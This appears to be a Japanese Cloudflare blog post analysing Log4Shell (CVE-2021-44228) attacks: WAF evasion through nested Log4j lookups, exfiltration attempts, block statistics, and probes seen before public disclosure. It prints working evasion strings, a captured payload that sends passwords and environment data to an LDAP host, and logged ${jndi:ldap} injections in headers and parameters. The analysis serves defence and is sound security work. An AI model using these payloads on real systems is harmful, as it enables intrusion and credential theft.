<div class="post-content lh-copy gray1">
	<p>このブログ記事では、世界で見られるWAFの回避パターンや流出未遂、不正利用未遂のトレンドデータ、<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">CVE-2021-44228</a>の公開前に見られた悪用に関する情報などを紹介します。 </p>
	<p>完結に言うと、<em>公開の8日前</em>の12月1日<em>に、</em>脆弱性の限定的なテストが実施されました。<em>公開からわずか9分後にこの脆弱性に対する最初の悪用の試みが見られ、</em>新しく見つかった問題を攻撃者がいかに迅速に悪用しているかを示しています。</p>
	<p>また、シンプルなブロッキングを行おうとするWAFを回避しようとする試み、秘密のクレデンシャルやパスワードを含むデータ流出未遂も大量に確認されています。</p>
	<h3 id="waf-">WAFの回避パターンと流出例</h3>
	<p>CVE-2021-44228（現在は一般に Log4Shell と呼ばれる）の<a href="https://www.lunasec.io/docs/blog/log4j-zero-day/" target="_blank">公開以来、</a>攻撃者は、単純な攻撃文字列を使うことから、積極的にWAF によるブロックを回避しようとする動きに移行していることが確認されています。WAF は外部からの攻撃者を阻止するための有用なツールであり、一般的には、単純なルールを突破するためのWAF の回避が試みられています。</p>
	<p>Log4j脆弱性の悪用の初期段階において、通常、攻撃者は &nbsp;<code>${jndi:dns</code>, <code>${jndi:rmi</code>と <code>${jndi:ldap</code>で始まる難読化していない文字列を使っており、これらのパターンを探すシンプルなルールは効果的でした。</p>
	<p>それらの文字列がブロックされた後すぐに、攻撃者は回避テクニックの使用に切り替えました。標準的な回避技術（文字のエスケープまたはエンコーディング）と <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank">Log4j Lookups言語</a> に特有の調整された回避の両方を使用してきました、そして現在も使用しています。</p>
	<p>どのレベルのWAFでも、標準的な技術には対応できるでしょう。${ を <code>%24%7B</code> または <code>\u0024\u007b</code> としてエンコードするようなトリックは、使われている特定の悪用をチェックするルールを適用する前に簡単に元に戻すことができます。</p>
	<p>しかし、Log4j言語は、いくつかのWAFが探すキー文字列を難読化できる豊富な機能を持っています。例えば、${lower} ルックアップでは文字列を小文字にします。したがって、${lower:H}では、h に変化します。攻撃者はルックアップを使って jndiのような重要な文字列を偽装し、WAFの回避に役立てているのです。</p>
	<p>実働環境では、<code>${date}</code>、 <code>${lower}</code>、 <code>${upper}</code>、 <code>${web}</code>、 <code>${main}</code>さらに回避のため <code>${env}</code> の使用が見られます。さらに、 <code>${env}</code>、 <code>${sys}</code>、 &nbsp;<code>${main}</code>（その他、Docker、Kubernetesなどのシステムに特化したルックアップ）が利用され、ターゲットプロセス環境からデータ（重要機密を含む）を流出させています。</p>
	<p>この言語がどのように使われているかをよりよく理解するために、コマンドラインから文字列を受け取り、Log4jを介してコンソールにログを記録する小さなJavaプログラムを紹介します：</p>
	<!--kg-card-begin: markdown-->
	<pre><code>import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4jTester{
    private static final Logger logger = LogManager.getLogger(log4jTester.class);
       
    public static void main(String[] args) {
	logger.error(args[0]);
    }
}
</code></pre>
	<!--kg-card-end: markdown-->
	<p>このシンプルなプログラムはコンソールに書き込みを行います。ここではhideという一語をログに記録しています。</p>
	<!--kg-card-begin: markdown-->
	<pre><code>$ java log4jTester.java 'hide'
01:28:25.606 [main] ERROR log4jTester - hide
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Log4j言語では、${}を ${} 内で使用することができます。このように、攻撃者は複数の異なるキーワードを組み合わせて回避することが可能です。例えば、次の &nbsp;<code>${lower:${lower:h}${lower:${upper:i}${lower:D}</code>eは、 hide という単語として記録されることになるでしょう。そのため、例えば ${jndi ,のようなシンプルな検索は、 jndiの文字も同様に隠せるので、攻撃者は簡単に回避することができるのです。</p>
	<!--kg-card-begin: markdown-->
	<pre><code>$ java log4jTester.java '${lower:${lower:h}}${lower:${upper:i}}${lower:d}e'
01:30:42.015 [main] ERROR log4jTester - hide
</code></pre>
	<!--kg-card-end: markdown-->
	<p>もう一つの主な回避方法は、:-構文を利用することです。この構文により、攻撃者は検索にデフォルト値を設定することができ、もし検索された値が空であれば、デフォルト値が出力されます。つまり、例えば、存在しない環境変数を検索して、単語の文字を出力することができます。</p>
	<!--kg-card-begin: markdown-->
	<pre><code>$ java log4jTester.java '${env:NOTEXIST:-h}i${env:NOTEXIST:-d}${env:NOTEXIST:-e}'
01:35:34.280 [main] ERROR log4jTester - hide
</code></pre>
	<!--kg-card-end: markdown-->
	<p><code>${web}</code> 、 <code>${main}</code> さらに <code>${::-h}</code>や <code>${:::::-h}</code>などの文字列でも同様の技術が使われて い ます。これは両方ともh に変化します。当然、これらの技術を組み合わせてより精巧な回避が試みられています。</p>
	<p>どのように回避が広まったかを知るために、難読化されていないWAFブロックに現れる ${jndi:（オレンジ色の線）、${lower} ルックアップ（緑線）の使用、URIエンコーディング（青線）、そして最近流行している回避方法 ${${::-j}${::-n}${::-d}${::-i} （赤線）を示したグラフを示します。</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2022/01/image--7-.png" class="kg-image"></figure>
	<p>最初の数日は、回避は比較的まれでした。しかし現在では <code>${jndi</code>:のような素朴な文字列は依然として人気がありますが、回避は急増しており、WAFはこれらの改良された攻撃をブロックしなければなりません。</p>
	<p>先週、不正利用の初期段階について書きましたが、<a href="https://blog.cloudflare.com/ja-jp/inside-the-log4j2-vulnerability-cve-2021-44228-ja-jp/">ほとんどが偵察に関するものでした</a>。それ以来攻撃者はデータ抽出に移行しています。</p>
	<p><code>${env}</code> の利用で環境変数を抽出したり <code>${sys}</code>でLog4jが動作しているシステムに関する情報を取得する攻撃が確認されています。実働環境でブロックされたある攻撃は様々なLog4jルックアップから多くのデータを流出させようとしました。</p>
	<!--kg-card-begin: markdown-->
	<pre><code>${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:
imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:cont
ainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx
:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES
_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}
</code></pre>
	<!--kg-card-end: markdown-->
	<p>そこでは、ユーザー、ホームディレクトリ、Dockerイメージ名、KubernetesやSpringの詳細、ユーザーやデータベースのパスワード、ホスト名、コマンドライン引数が流出されていることが確認できます。</p>
	<p>回避と流出ともに高度化しており巧妙であるため、WAFベンダーは${の発生に注目し、それを疑わしいものとして処理する必要があるのです。このため、<a href="https://blog.cloudflare.com/ja-jp/log4j-cloudflare-logs-mitigation-ja-jp/">お客様にお送りするあらゆるログ</a> をサニタイズして &nbsp;${を x{ に変換して提供しています。</p>
	<p>Cloudflare WAFチームは悪用未遂を阻止するために継続的に取り組んでいますが、お客様はシステムに最新のLog4jを適用するか、軽減策を適用することが不可欠です。ログに記録されるデータは必ずしもインターネットを経由しているとは限らないため、インターネットに接続しているか否かにかかわらず、システムにはパッチが必要です。</p>
	<p>すべての有償のお客様には、CVE-2021-44228に対する保護に役立つ設定可能なWAFルールがありますが、無償のお客様にも保護機能を導入しています。</p>
	<h3 id="cve-2021-44228-">CVE-2021-44228 不正利用の傾向</h3>
	<p>Cloudflareはこれらの攻撃をブロックするために、WAFルールを即座に導入しました。次の図は、ブロックされた攻撃がどのように進化していったかを示しています。</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2022/01/image3-39.png" class="kg-image"></figure>
	<p>12月10日から12月13日まで1分あたりのブロック数が次のように急増しました。</p>
	<!--kg-card-begin: markdown-->
	<table>
		<thead>
			<tr>
				<th style="text-align:center">日付</th>
				<th style="text-align:center">ブロックされた平均リクエスト数/分</th>
			</tr>
		</thead>
		<tbody>
			<tr>
				<td style="text-align:center">2021-12-10</td>
				<td style="text-align:center">5,483</td>
			</tr>
			<tr>
				<td style="text-align:center">2021-12-11</td>
				<td style="text-align:center">18,606</td>
			</tr>
			<tr>
				<td style="text-align:center">2021-12-12</td>
				<td style="text-align:center">27,439</td>
			</tr>
			<tr>
				<td style="text-align:center">2021-12-13</td>
				<td style="text-align:center">24,642</td>
			</tr>
		</tbody>
	</table>
	<!--kg-card-end: markdown-->
	<p>最初の<a href="https://blog.cloudflare.com/ja-jp/actual-cve-2021-44228-payloads-captured-in-the-wild-ja-jp/">ブログ記事</a> では、不正利用しようとした攻撃元のトップがカナダ（下の緑色の線）であったことを指摘しました。予測したとおりこの傾向は続かず、攻撃はサーバーから直接またはプロキシ経由で、世界中から来ています。</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2022/01/image1-72.png" class="kg-image"></figure>
	<h3 id="-cve-2021-44228-">開示前のCVE-2021-44228の不正利用</h3>
	<p>CVE-2021-44228 は2021-12-09 14:25 UTC のツイート（現在は削除済み）に開示されました：</p>
	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2022/01/image2-53.png" class="kg-image"></figure>
	<p>しかし、当社のシステムでは2021年12月1日に以下の3件の不正利用またはスキャンの試行を捉えています。それぞれでIPアドレスとドメイン名を難読化しています。これらの3つは、 <code>${jndi:ldap}</code>ルックアップを <code>HTTP User-Agent</code>ヘッダー、 <code>Referer</code>ヘッダー、URI パラメーターに注入しています。</p>
	<!--kg-card-begin: markdown-->
	<pre><code>2021-12-01 03:58:34
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://rb3w24.example.com/x}
Referer: /${jndi:ldap://rb3w24.example.com/x}
Path: /$%7Bjndi:ldap://rb3w24.example.com/x%7D
2021-12-01 04:36:50
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://y3s7xb.example.com/x}
Referer: /${jndi:ldap://y3s7xb.example.com/x}
パラメータ: x=$%7Bjndi:ldap://y3s7xb.example.com/x%7D						
2021-12-01 04:20:30
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://vf9wws.example.com/x}
Referer: /${jndi:ldap://vf9wws.example.com/x}
パラメータ: x=$%7Bjndi:ldap://vf9wws.example.com/x%7D	
</code></pre>
	<!--kg-card-end: markdown-->
	<p>この3回の試行の後、開示から9分後に何者かが ゲームサイトのURIパラメータを経由して <code>${jndi:ldap}</code> 文字列を注入しようとするまで、それ以上の活動は見られませんでした。</p>
	<!--kg-card-begin: markdown-->
	<pre><code>2021-12-09 14:34:31
パラメータ: redirectUrl=aaaaaaa$aadsdasad$${jndi:ldap://log4.cj.d.example.com/exp}
</code></pre>
	<!--kg-card-end: markdown-->
	<h3 id="-">まとめ</h3>
	<p>CVE-2021-44228は、多数のアクターによって活発に不正利用されています。WAFは外部からの攻撃を防ぐための対策として有効ですが、決して万全なものではなく、攻撃者は積極的に回避策を講じています。データやクレデンシャルが流出する可能性は想像以上に高く、より壊滅的なハッキングや攻撃の長期的なリスクは非常に現実的なものとなっています。</p>
	<p>Log4j を使用するソフトウェアの影響を軽減し、パッチを適用することは待ったなしの状況です。</p>
</div>